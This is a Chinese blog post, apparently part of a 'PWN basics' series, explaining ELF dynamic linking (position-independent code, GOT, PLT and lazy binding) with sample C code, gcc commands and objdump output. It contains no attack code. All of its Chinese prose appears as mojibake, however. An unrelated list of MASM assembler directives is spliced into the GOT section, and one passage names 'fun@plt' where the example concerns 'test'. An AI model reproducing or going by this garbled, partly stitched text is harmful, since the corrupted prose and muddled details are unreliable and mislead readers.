<strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºåœ¨è¿è¡Œæ—¶å¯ä»¥åŠ¨æ€åœ°é€‰æ‹©åŠ è½½å„ç§æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨çš„æ’ä»¶ã€‚è½¯ä»¶çš„å¼€å‘å•†å¼€å‘æŸä¸ªäº§å“æ—¶ä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ¶å®šå¥½ç¨‹åºçš„æ¥å£ï¼Œå…¶ä»–å¼€å‘è€…å°±å¯ä»¥é€šè¿‡è¿™ç§æ¥å£æ¥ç¼–å†™ç¬¦åˆè¦æ±‚çš„åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œä»¥æ­¤æ¥å®ç°ç¨‹åºåŠŸèƒ½çš„æ‰©å±•ã€‚å¢å¼ºå…¼å®¹æ€§æ˜¯è¡¨ç°åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºå¯¹ä¸åŒå¹³å°çš„ä¾èµ–å·®å¼‚æ€§é™ä½ï¼Œæ¯”å¦‚å¯¹æŸä¸ªå‡½æ•°çš„å®ç°æœºåˆ¶ä¸åŒï¼Œ<em>å¦‚æœæ˜¯ <strong>é™æ€é“¾æ¥</strong> çš„ç¨‹åºä¼šä¸ºä¸åŒå¹³å°å‘å¸ƒä¸åŒçš„ç‰ˆæœ¬ï¼Œè€Œåœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸åŒçš„å¹³å°éƒ½èƒ½æä¾›ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“åŒ…å«è¯¥å‡½æ•°ä¸”æ¥å£ç›¸åŒï¼Œå°±åªéœ€ç”¨ä¸€ä¸ªç‰ˆæœ¬äº†</em>ã€‚<br>æ€»è€Œè¨€ä¹‹ï¼Œ<strong>åŠ¨æ€é“¾æ¥</strong> çš„ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šæ ¹æ®è‡ªå·±æ‰€ä¾èµ–çš„ <strong>åŠ¨æ€é“¾æ¥åº“</strong> ï¼Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ä»–ä»¬åŠ è½½è‡³å†…å­˜ä¸­ï¼Œå¹¶åœ¨æ­¤æ—¶å°†ä»–ä»¬é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„ç¨‹åºã€‚<br>Linux ç³»ç»Ÿä¸­ï¼Œ<strong>ELF</strong> åŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º <strong>åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDynamic Shared Objectsï¼‰</strong> ï¼Œ ç®€ç§° <strong>å…±äº«å¯¹è±¡</strong> ä¸€èˆ¬éƒ½æ˜¯ä»¥ â€œ<code>.so</code>â€ ä¸ºæ‰©å±•åçš„æ–‡ä»¶ï¼›åœ¨ windows ç³»ç»Ÿä¸­å°±æ˜¯å¸¸å¸¸è½¯ä»¶æŠ¥é”™ç¼ºå°‘<code>xxx.dll</code> æ–‡ä»¶ã€‚</p><h3 id="GOT-Global-offset-table"><a href="#GOT-Global-offset-table" class="headerlink" title="GOT(Global offset table)"></a>GOT(Global offset table)</h3><p><strong>å…±äº«å¯¹è±¡</strong> åœ¨è¢«è£…è½½æ—¶ï¼Œå¦‚ä½•ç¡®å®šå…¶åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Ÿ<br>è¦ä½¿ <strong>å…±äº«å¯¹è±¡</strong> èƒ½åœ¨ä»»æ„åœ°å€è£…è½½å°±éœ€è¦åˆ©ç”¨åˆ° <strong>è£…è½½æ—¶é‡å®šä½</strong> çš„æ€æƒ³ï¼Œå³åœ¨é“¾æ¥æ—¶å¯¹æ‰€æœ‰çš„ç»å¯¹åœ°å€çš„å¼•ç”¨ä¸åšé‡å®šä½è€Œå°†è¿™ä¸€æ­¥æ¨è¿Ÿåˆ°è£…è½½æ—¶å†å®Œæˆï¼Œä¸€æ—¦è£…è½½æ¨¡å—ç¡®å®šï¼Œç³»ç»Ÿå°±å¯¹æ‰€æœ‰çš„ç»å¯¹åœ°å€å¼•ç”¨è¿›è¡Œé‡å®šä½ã€‚ä½†æ˜¯éšä¹‹è€Œæ¥çš„é—®é¢˜æ˜¯ï¼ŒæŒ‡ä»¤éƒ¨åˆ†æ— æ³•åœ¨å¤šä¸ªè¿›ç¨‹ä¹‹é—´å…±äº«ï¼Œè¿™åˆäº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„æŠ€æœ¯ <strong>åœ°å€æ— å…³ä»£ç  ï¼ˆPICï¼ŒPosition-independent Codeï¼‰</strong>ï¼Œè¯¥æŠ€æœ¯åŸºæœ¬æ€æƒ³å°±æ˜¯å°†æŒ‡ä»¤ä¸­éœ€è¦è¢«ä¿®æ”¹çš„éƒ¨åˆ†åˆ†ç¦»å‡ºæ¥æ”¾åœ¨æ•°æ®éƒ¨åˆ†ï¼Œè¿™æ ·å°±èƒ½ä¿è¯æŒ‡ä»¤éƒ¨åˆ†ä¸å˜ä¸”æ•°æ®éƒ¨åˆ†åˆå¯ä»¥åœ¨è¿›ç¨‹ç©ºé—´ä¸­ä¿ç•™ä¸€ä¸ªå‰¯æœ¬ï¼Œä¹Ÿå°±é¿å…äº†ä¸èƒ½èŠ‚çœç©ºé—´çš„æƒ…å†µã€‚é‚£ä¹ˆé‡æ–°å®šä½åçš„ç¨‹åºæ˜¯æ€ä¹ˆè¿›è¡Œæ•°æ®è®¿é—®å’Œå‡½æ•°è°ƒç”¨çš„å‘¢ï¼Ÿä¸‹é¢ç”¨å®é™…ä»£ç éªŒè¯ :</p><p>ç¼–å†™ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªæ˜¯ç¨‹åºè‡ªèº«çš„ä»£ç æ¨¡å—ï¼Œå¦ä¸€ä¸ªæ˜¯å…±äº«å¯¹è±¡æ¨¡å—ã€‚ä»¥æ­¤æ¥å­¦ä¹ åŠ¨æ€é“¾æ¥çš„ç¨‹åºæ˜¯å¦‚ä½•è¿›è¡Œæ¨¡å—å†…ã€æ¨¡å—é—´çš„å‡½æ•°è°ƒç”¨å’Œæ•°æ®è®¿é—®<br><strong>ç¼–å†™å…±äº«æ–‡ä»¶</strong>å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">got_extern.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> b;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>ç¼–è¯‘æˆ32ä½å…±äº«å¯¹è±¡æ–‡ä»¶</strong>ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc got_extern.c -fPIC -shared -m32 -o got_extern.so</span><br></pre></td></tr></table></figure></p><blockquote><p><code>-fPIC</code> é€‰é¡¹æ˜¯ç”Ÿæˆåœ°å€æ— å…³ä»£ç çš„ä»£ç ï¼Œgcc ä¸­è¿˜æœ‰å¦ä¸€ä¸ª -fpic é€‰é¡¹ï¼Œå·®åˆ«æ˜¯fPICäº§ç”Ÿçš„ä»£ç è¾ƒå¤§ä½†æ˜¯è·¨å¹³å°æ€§è¾ƒå¼ºè€Œfpicäº§ç”Ÿçš„ä»£ç è¾ƒå°ï¼Œä¸”ç”Ÿæˆé€Ÿåº¦æ›´å¿«ä½†æ˜¯åœ¨ä¸åŒå¹³å°ä¸­ä¼šæœ‰é™åˆ¶ã€‚ä¸€èˆ¬ä¼šé‡‡ç”¨fPICé€‰é¡¹<br><code>-shared</code> é€‰é¡¹æ˜¯ç”Ÿæˆå…±äº«å¯¹è±¡æ–‡ä»¶<br><code>-m32</code> é€‰é¡¹æ˜¯ç¼–è¯‘æˆ32ä½ç¨‹åº<br><code>-o</code> é€‰é¡¹æ˜¯å®šä¹‰è¾“å‡ºæ–‡ä»¶çš„åç§°</p></blockquote><p><strong>ç¼–å†™ä»£ç æ¨¡å—</strong>å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">got.c <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;  </span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span>  </span><br><span class="line">&#123;  </span><br><span class="line">a = <span class="number">1</span>;  </span><br><span class="line">b = <span class="number">2</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span>  </span><br><span class="line">&#123;  </span><br><span class="line">fun();  </span><br><span class="line">test();  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hey!&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>å’Œå…±äº«æ¨¡å—ä¸€åŒç¼–è¯‘</strong>ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc got.c ./got_extern.so -m32 -o got</span><br></pre></td></tr></table></figure><br>ç”¨ <code>objdump</code> æŸ¥çœ‹åæ±‡ç¼–ä»£ç  <code>objdump -D -Mintel got</code>ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">000011b9 &lt;fun&gt;:  </span><br><span class="line">11b9: 55 push ebp  </span><br><span class="line">11ba: 89 e5 mov ebp,esp  </span><br><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00  </span><br><span class="line">11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  </span><br><span class="line">11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2  </span><br><span class="line">11dc: 90 nop  </span><br><span class="line">11dd: 5d pop ebp  </span><br><span class="line">11de: c3 ret  </span><br><span class="line">  </span><br><span class="line">000011df &lt;main&gt;:  </span><br><span class="line">11df: 8d 4c 24 04 lea ecx,[esp+0x4]  </span><br><span class="line">11e3: 83 e4 f0 and esp,0xfffffff0  </span><br><span class="line">11e6: ff 71 <span class="built_in">fc</span> push DWORD PTR [ecx-0x4]  </span><br><span class="line">11e9: 55 push ebp  </span><br><span class="line">11ea: 89 e5 mov ebp,esp  </span><br><span class="line">11ec: 53 push ebx  </span><br><span class="line">11ed: 51 push ecx  </span><br><span class="line">11ee: e8 <span class="built_in">cd</span> fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  </span><br><span class="line">11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt; </span><br><span class="line">11fe: e8 5d fe ff ff call 1060 &lt;<span class="built_in">test</span>@plt&gt;  </span><br><span class="line">1203: 83 ec 0c sub esp,0xc  </span><br><span class="line">1206: 8d 83 08 e0 ff ff lea eax,[ebx-0x1ff8]  </span><br><span class="line">120c: 50 push eax  </span><br><span class="line">120d: e8 2e fe ff ff call 1040 &lt;<span class="built_in">printf</span>@plt&gt;  </span><br><span class="line">1212: 83 c4 10 add esp,0x10  </span><br><span class="line">1215: b8 00 00 00 00 mov eax,0x0  </span><br><span class="line">121a: 8d 65 f8 lea esp,[ebp-0x8]  </span><br><span class="line">121d: 59 pop ecx  </span><br><span class="line">121e: 5b pop ebx  </span><br><span class="line">121f: 5d pop ebp  </span><br><span class="line">1220: 8d 61 <span class="built_in">fc</span> lea esp,[ecx-0x4]  </span><br><span class="line">1223: c3 ret</span><br></pre></td></tr></table></figure></p><h4 id="æ¨¡å—å†…éƒ¨è°ƒç”¨"><a href="#æ¨¡å—å†…éƒ¨è°ƒç”¨" class="headerlink" title="æ¨¡å—å†…éƒ¨è°ƒç”¨"></a>æ¨¡å—å†…éƒ¨è°ƒç”¨</h4><p>main()å‡½æ•°ä¸­è°ƒç”¨ fun()å‡½æ•° ï¼ŒæŒ‡ä»¤ä¸ºï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11f9:e8 bb ff ff ff       call   11b9 &lt;fun&gt;</span><br></pre></td></tr></table></figure><br>fun() å‡½æ•°æ‰€åœ¨çš„åœ°å€ä¸º 0x000011b9 ï¼Œæœºå™¨ç  e8 ä»£è¡¨ call æŒ‡ä»¤ï¼Œä¸ºä»€ä¹ˆåé¢æ˜¯ bb ff ff ff è€Œä¸æ˜¯ b9 11 00 00 ï¼ˆå°ç«¯å­˜å‚¨ï¼‰å‘¢ï¼Ÿè¿™<em>åé¢çš„å››ä¸ªå­—èŠ‚ä»£è¡¨ç€ç›®çš„åœ°å€ç›¸å¯¹äºå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€çš„åç§»</em>ï¼Œå³ 0x11f9 + 0x5 + (-69) = 0x11b9 ï¼Œ0xffffffbb æ˜¯ -69 çš„è¡¥ç å½¢å¼ï¼Œ<em>è¿™æ ·åšå°±å¯ä»¥ä½¿ç¨‹åºæ— è®ºè¢«è£…è½½åˆ°å“ªé‡Œéƒ½ä¼šæ­£å¸¸æ‰§è¡Œ</em>ã€‚</p><h4 id="æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®"><a href="#æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®" class="headerlink" title="æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®"></a>æ¨¡å—å†…éƒ¨æ•°æ®è®¿é—®</h4><p>ELF æ–‡ä»¶æ˜¯ç”±å¾ˆå¤šå¾ˆå¤šçš„ <strong>æ®µ(segment)</strong> æ‰€ç»„æˆï¼Œå¸¸è§çš„å°±å¦‚ .text (ä»£ç æ®µ) ã€.data(æ•°æ®æ®µï¼Œå­˜æ”¾å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡æˆ–é™æ€å˜é‡)ã€.bss(æ•°æ®æ®µï¼Œå­˜æ”¾æœªåˆå§‹åŒ–å…¨å±€å˜é‡)ç­‰ï¼Œè¿™æ ·å°±èƒ½åšåˆ°æ•°æ®ä¸æŒ‡ä»¤åˆ†ç¦»äº’ä¸å¹²æ‰°ã€‚åœ¨åŒä¸€ä¸ªæ¨¡å—ä¸­ï¼Œä¸€èˆ¬å‰é¢çš„å†…å­˜åŒºåŸŸå­˜æ”¾ç€ä»£ç åé¢çš„åŒºåŸŸå­˜æ”¾ç€æ•°æ®(è¿™é‡ŒæŒ‡çš„æ˜¯ .data æ®µ)ã€‚<br><em>é‚£ä¹ˆæŒ‡ä»¤æ˜¯å¦‚ä½•è®¿é—®è¿œåœ¨ .data æ®µ ä¸­çš„æ•°æ®å‘¢?</em><br>è§‚å¯Ÿ fun() å‡½æ•°ä¸­ç»™é™æ€å˜é‡ a èµ‹å€¼çš„æŒ‡ä»¤ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00</span><br></pre></td></tr></table></figure><br>ä»ä¸Šé¢çš„æŒ‡ä»¤ä¸­å¯ä»¥çœ‹å‡ºï¼Œå®ƒå…ˆè°ƒç”¨äº† <code>__x86.get_pc_thunk.ax()</code>å‡½æ•°ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001224 &lt;__x86.get_pc_thunk.ax&gt;:  </span><br><span class="line">1224: 8b 04 24 mov eax,DWORD PTR [esp]  </span><br><span class="line">1227: c3 ret</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯æŠŠè¿”å›åœ°å€çš„å€¼æ”¾åˆ° eax å¯„å­˜å™¨ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠ0x000011c1ä¿å­˜åˆ°eaxä¸­ï¼Œç„¶åå†åŠ ä¸Š 0x2e3f ï¼Œæœ€åå†åŠ ä¸Š 0x24 ã€‚å³ 0x000011c1 + 0x2e3f + 0x24 = 0x4024ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ç›¸å¯¹äºæ¨¡å—åŠ è½½åŸºå€çš„å€¼ã€‚é€šè¿‡è¿™æ ·å°±èƒ½è®¿é—®åˆ°æ¨¡å—å†…éƒ¨çš„æ•°æ®ã€‚<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250124150617.png" alt="Pasted image 20250124150617"></p><h4 id="æ¨¡å—é—´æ•°æ®è®¿é—®"><a href="#æ¨¡å—é—´æ•°æ®è®¿é—®" class="headerlink" title="æ¨¡å—é—´æ•°æ®è®¿é—®"></a>æ¨¡å—é—´æ•°æ®è®¿é—®</h4><p>å˜é‡ b è¢«å®šä¹‰åœ¨å…¶ä»–æ¨¡å—ä¸­ï¼Œå…¶åœ°å€éœ€è¦åœ¨ç¨‹åºè£…è½½æ—¶æ‰èƒ½å¤Ÿç¡®å®šã€‚åˆ©ç”¨åˆ°å‰é¢çš„ä»£ç åœ°å€æ— å…³çš„æ€æƒ³ï¼ŒæŠŠåœ°å€ç›¸å…³çš„éƒ¨åˆ†æ”¾å…¥æ•°æ®æ®µä¸­ï¼Œç„¶è€Œè¿™é‡Œçš„å˜é‡ b çš„åœ°å€ä¸å…¶è‡ªèº«æ‰€åœ¨çš„æ¨¡å—è£…è½½çš„åœ°å€æœ‰å…³ã€‚è§£å†³ï¼šELF ä¸­åœ¨æ•°æ®æ®µé‡Œé¢å»ºç«‹äº†ä¸€ä¸ª<strong>æŒ‡å‘è¿™äº›å˜é‡çš„æŒ‡é’ˆæ•°ç»„</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <strong>GOT è¡¨(Global offset Tableï¼Œ å…¨å±€åç§»è¡¨ ï¼‰</strong>ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯å½“ä»£ç éœ€è¦å¼•ç”¨å…¨å±€å˜é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡ GOT è¡¨é—´æ¥å¼•ç”¨ã€‚</p><p>æŸ¥çœ‹åæ±‡ç¼–ä»£ç ä¸­æ˜¯å¦‚ä½•è®¿é—®å˜é‡ b çš„ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11bc: e8 63 00 00 00 call 1224 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11c1: 05 3f 2e 00 00 add eax,0x2e3f  </span><br><span class="line">11c6: c7 80 24 00 00 00 01 mov DWORD PTR [eax+0x24],0x1  </span><br><span class="line">11cd: 00 00 00  </span><br><span class="line">11d0: 8b 80 ec ff ff ff mov eax,DWORD PTR [eax-0x14]  </span><br><span class="line">11d6: c7 00 02 00 00 00 mov DWORD PTR [eax],0x2</span><br></pre></td></tr></table></figure><br>è®¡ç®—å˜é‡ b åœ¨ GOT è¡¨ä¸­çš„ä½ç½®ï¼Œ0x11c1 + 0x2e3f - 0x14 = 0x3fec ï¼ŒæŸ¥çœ‹ GOT è¡¨çš„ä½ç½®ã€‚</p><p>å‘½ä»¤ objdump -h got ï¼ŒæŸ¥çœ‹ELFæ–‡ä»¶ä¸­çš„èŠ‚å¤´å†…å®¹ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21 .got 00000018 00003fe8 00003fe8 00002fe8 2**2  </span><br><span class="line">CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><br>è¿™é‡Œå¯ä»¥çœ‹åˆ° .got åœ¨æ–‡ä»¶ä¸­çš„åç§»æ˜¯ 0x00003fe8ï¼Œç°åœ¨æ¥çœ‹åœ¨åŠ¨æ€è¿æ¥æ—¶éœ€è¦é‡å®šä½çš„é¡¹ï¼Œä½¿ç”¨ <code>objdump -R got</code>å‘½ä»¤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00003fec R_386_GLOB_DAT    b</span><br></pre></td></tr></table></figure><br>xxxxxxxxxx7 1        ã€€ã€€DW      å®šä¹‰å­—(2å­—èŠ‚).  2        PROC    å®šä¹‰è¿‡ç¨‹.  3        ENDP    è¿‡ç¨‹ç»“æŸ.  4        SEGMENT å®šä¹‰æ®µ.  5        ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  6        ENDS    æ®µç»“æŸ.  7        END    ç¨‹åºç»“æŸ.C</p><h4 id="æ¨¡å—é—´å‡½æ•°è°ƒç”¨"><a href="#æ¨¡å—é—´å‡½æ•°è°ƒç”¨" class="headerlink" title="æ¨¡å—é—´å‡½æ•°è°ƒç”¨"></a>æ¨¡å—é—´å‡½æ•°è°ƒç”¨</h4><p>æ¨¡å—é—´å‡½æ•°è°ƒç”¨ç”¨åˆ°äº†å»¶è¿Ÿç»‘å®šï¼Œéƒ½æ˜¯å‡½æ•°å@pltçš„å½¢å¼<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11fe:e8 5d fe ff ff       call   1060 &lt;<span class="built_in">test</span>@plt&gt;</span><br></pre></td></tr></table></figure></p><h3 id="å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#å»¶è¿Ÿç»‘å®š-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>å»¶è¿Ÿç»‘å®š(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h3><p><strong>å› ä¸º<em>åŠ¨æ€é“¾æ¥</em>çš„ç¨‹åºæ˜¯åœ¨è¿è¡Œæ—¶éœ€è¦å¯¹å…¨å±€å’Œé™æ€æ•°æ®è®¿é—®è¿›è¡ŒGOTå®šä½ï¼Œç„¶åé—´æ¥å¯»å€ã€‚åŒæ ·ï¼Œå¯¹äºæ¨¡å—é—´çš„è°ƒç”¨ä¹Ÿéœ€è¦GOTå®šä½ï¼Œå†æ‰é—´æ¥è·³è½¬</strong>ï¼Œè¿™ä¹ˆåšåŠ¿å¿…ä¼šå½±å“åˆ°ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ã€‚è€Œä¸”ç¨‹åºåœ¨è¿è¡Œæ—¶å¾ˆå¤§ä¸€éƒ¨åˆ†å‡½æ•°éƒ½å¯èƒ½ç”¨ä¸åˆ°ï¼Œäºæ˜¯ELFé‡‡ç”¨äº†å½“å‡½æ•°ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰è¿›è¡Œç»‘å®šçš„æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <strong>å»¶è¿Ÿç»‘å®š</strong>ã€‚ELFå®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> æ˜¯é€šè¿‡ <strong>PLT</strong> ï¼Œ<strong>åŸå…ˆ GOT ä¸­å­˜æ”¾ç€å…¨å±€å˜é‡å’Œå‡½æ•°è°ƒç”¨ï¼Œç°åœ¨æŠŠä»–æ‹†æˆå¦ä¸ªéƒ¨åˆ† .got å’Œ .got.pltï¼Œç”¨ .got å­˜æ”¾ç€å…¨å±€å˜é‡å¼•ç”¨ï¼Œç”¨ .got.plt å­˜æ”¾ç€å‡½æ•°å¼•ç”¨</strong>ã€‚<br>æŸ¥çœ‹ test@plt ä»£ç ï¼Œç”¨ <code>objdump -Mintel -d -j .plt got</code></p><blockquote><p>-Mintel é€‰é¡¹æŒ‡å®š intel æ±‡ç¼–è¯­æ³•<br>-d é€‰é¡¹å±•ç¤ºå¯æ‰§è¡Œæ–‡ä»¶èŠ‚çš„æ±‡ç¼–å½¢å¼<br>-j é€‰é¡¹åé¢è·Ÿä¸ŠèŠ‚åï¼ŒæŒ‡å®šèŠ‚</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00001060 &lt;<span class="built_in">test</span>@plt&gt;:  </span><br><span class="line">1060: ff a3 14 00 00 00 jmp DWORD PTR [ebx+0x14]  </span><br><span class="line">1066: 68 10 00 00 00 push 0x10  </span><br><span class="line">106b: e9 c0 ff ff ff jmp 1030 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ main()å‡½æ•° ä¸­è°ƒç”¨ test@plt çš„åæ±‡ç¼–ä»£ç <br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11ee: e8 <span class="built_in">cd</span> fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  </span><br><span class="line">11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt;  </span><br><span class="line">11fe: e8 5d fe ff ff call 1060 &lt;<span class="built_in">test</span>@plt&gt;</span><br></pre></td></tr></table></figure></p><p><code>__x86.gett_pc_thunk.bx</code>å‡½æ•°ä¸ä¹‹å‰çš„ <code>__x86.get_pc_thunk.ax</code>åŠŸèƒ½ä¸€æ · ï¼Œå¾—å‡º ebx = 0x11f3 + 0x2e0d = 0x4000 ï¼Œebx + 0x14 = 0x4014 ã€‚é¦–å…ˆ jmp æŒ‡ä»¤ï¼Œè·³è½¬åˆ° 0x4014 è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€åœ¨ .got.plt èŠ‚ä¸­ ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125134945.png" alt="Pasted image 20250125134945"><br>ä¹Ÿå°±æ˜¯å½“ç¨‹åºéœ€è¦è°ƒç”¨åˆ°å…¶ä»–æ¨¡å—ä¸­çš„å‡½æ•°æ—¶ä¾‹å¦‚ fun() ï¼Œå°±å»è®¿é—®ä¿å­˜åœ¨ .got.plt ä¸­çš„ fun@plt ã€‚è¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªåœ°æ–¹å°±å­˜æ”¾ç€ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±ç›¸å½“äºä»€ä¹ˆéƒ½ä¸åšã€‚<br>ç”¨ <code>objdump -d -s got -j .got.plt</code> å‘½ä»¤æŸ¥çœ‹èŠ‚ä¸­çš„å†…å®¹</p><blockquote><p>-s å‚æ•°æ˜¾ç¤ºæŒ‡å®šèŠ‚çš„æ‰€æœ‰å†…å®¹<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135018.png" alt="Pasted image 20250125135018"></p></blockquote><p>4014 å¤„å­˜æ”¾ç€ 66 10 00 00 ï¼Œå› ä¸ºæ˜¯å°ç«¯åºæ‰€ä»¥åº”ä¸º 0x00001066ï¼Œè¿™ä¸ªä½ç½®åˆšå¥½å¯¹åº”ç€ push 0x10 è¿™æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå€¼æ˜¯ test è¿™ä¸ªç¬¦å·åœ¨ .rel.plt èŠ‚ä¸­çš„ä¸‹æ ‡ã€‚ç»§ç»­ jmp æŒ‡ä»¤è·³åˆ° .plt å¤„<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135342.png" alt="Pasted image 20250125135342"><br>push DWORD PTR [ebx + 0x4] æŒ‡ä»¤æ˜¯å°†å½“å‰æ¨¡å—IDå‹æ ˆï¼Œä¹Ÿå°±æ˜¯ got.c æ¨¡å—ï¼Œæ¥ç€ jmp DWORD PTR [ebx + 0x8] ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯è·³è½¬åˆ° <strong>åŠ¨æ€é“¾æ¥å™¨</strong> ä¸­çš„ <code>_dl_runtime_resolve</code>å‡½æ•°ä¸­å»ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯åœ¨å¦å¤–çš„æ¨¡å—ä¸­æŸ¥æ‰¾éœ€è¦çš„å‡½æ•°ï¼Œå°±æ˜¯è¿™é‡Œçš„åœ¨ got_extern.so æ¨¡å—ä¸­çš„ test å‡½æ•°ã€‚<br>ç„¶å<code>_dl_runtime_resolve</code>å‡½æ•°ä¼šå°† test() å‡½æ•°çš„çœŸæ­£åœ°å€å¡«å…¥åˆ° test@got ä¸­å»ä¹Ÿå°±æ˜¯ .got.plt 